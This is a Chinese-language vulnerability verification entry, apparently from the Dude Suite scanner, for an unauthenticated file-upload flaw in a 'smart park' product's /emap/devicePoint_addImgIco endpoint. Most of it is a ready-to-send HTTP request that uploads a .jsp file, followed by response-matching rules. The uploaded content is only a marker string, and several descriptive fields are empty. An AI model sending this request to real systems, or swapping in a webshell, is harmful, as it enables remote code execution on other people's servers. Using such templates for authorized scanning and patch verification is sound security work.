﻿# 华智慧园区文件上传RCE

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：

> 验证脚本：HTTP

```
POST /emap/devicePoint_addImgIco?hasSubsystem=true HTTP/1.1
Content-Type: multipart/form-data; boundary=A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT

--A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT
Content-Disposition: form-data; name="upload"; filename="dude.jsp"
Content-Type: application/octet-stream
Content-Transfer-Encoding: binary

dude
--A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT--
```

> 响应代码特征：200

> 响应内容特征：^(?=.*?code)(?=.*?data).*?$

> 上传文件定位：

> 验证文件来源：Dude Suite Web Security Tools - https://www.dudesuite.cn - 转载请注明出处
